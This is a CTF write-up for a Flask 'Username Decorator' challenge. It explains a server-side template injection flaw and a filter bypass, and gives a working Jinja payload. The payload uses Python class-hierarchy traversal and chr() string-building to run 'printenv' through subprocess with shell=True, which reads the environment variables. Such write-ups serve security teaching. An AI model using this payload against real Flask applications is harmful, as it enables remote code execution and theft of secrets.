# Username Decorator

## Brief

My favorite social media platform, Prorope, has overhauled their username system and now supports prefixes and suffixes! Isn't that so cool?
For one, I know that I would really love to be the !! JW !!, so I made a website to preview these username changes.
Note: the flag is in an environment variable called **FLAG**

```python
from flask import Flask, render_template_string, request
import re

app = Flask(__name__)
app.config['FLAG_LOCATION'] = 'os.getenv("FLAG")'

def validate_username(username):
   return bool(re.fullmatch("[a-zA-Z0-9._\[\]\(\)\-=,]{2,}", username))

@app.route('/', methods=['GET', 'POST'])
def index():
   prefix = ''
   username = ''
   suffix = ''

   if request.method == 'POST':
      prefix = (request.form['prefix'] or '')[:2]
      username = request.form['username'] or ''
      suffix = (request.form['suffix'] or '')[:2]
      if not validate_username(username): username = 'Invalid Username'
      template = '<!DOCTYPE html><html><body>\
      <form action="" method="post">\
      Prefix: <input name="prefix"> <br>\
      Username: <input name="username"> <br>\
      Suffix: <input name="suffix"> <br> \
      <input type="submit" value="Preview!">\
      </form><h2>%s %s %s</h2></body></html>' % (prefix, username, suffix)
   return render_template_string(template)

@app.route('/flag')
def get_flag():
   return 'Nein'

import os
return eval(app.config['FLAG_LOCATION'])
```

# Analysis

Same with [Bonus: The Revenge of Checkpass 1](../../binary-exploit/Checkpass-1) but here we able to see the class name

But there was filter but not sanitize validate_username() not allowed us to put **'** **"** which mean we cannot pass **'printenv'** or **"printenv"** but because there was not sanitize input we can manipulate it with **str(chr(ord(39)) str(chr(ord(108)) str(chr(ord(115)) str(chr(ord(39))** will convert to **'ls'** but still we cant concatenate the string using **+** symbol so there fore we need to assign the **'ls'** into list then join it

# Solution

we cant simply pass str or chr because jinja will read as variable so we need to call it from the bases class

```python
().__class__.__base__.__subclasses__()[69]
self.__init__.__globals__.__builtins__.chr

```

69 is the position of the str class
and also with the chr

so here is the payload
we call printenv to see the env variable

```python
().__class__.__base__.__subclasses__()[339](().__class__.__base__.__subclasses__()[69]().join([self.__init__.__globals__.__builtins__.chr(112),self.__init__.__globals__.__builtins__.chr(114),self.__init__.__globals__.__builtins__.chr(105),self.__init__.__globals__.__builtins__.chr(110),self.__init__.__globals__.__builtins__.chr(116),self.__init__.__globals__.__builtins__.chr(101),self.__init__.__globals__.__builtins__.chr(110),self.__init__.__globals__.__builtins__.chr(118)]),shell=True,stdout=-1).communicate()
```

**ctf{j4st_us3_pr0p3r_t3mp14t1ng_4lr34dy}**
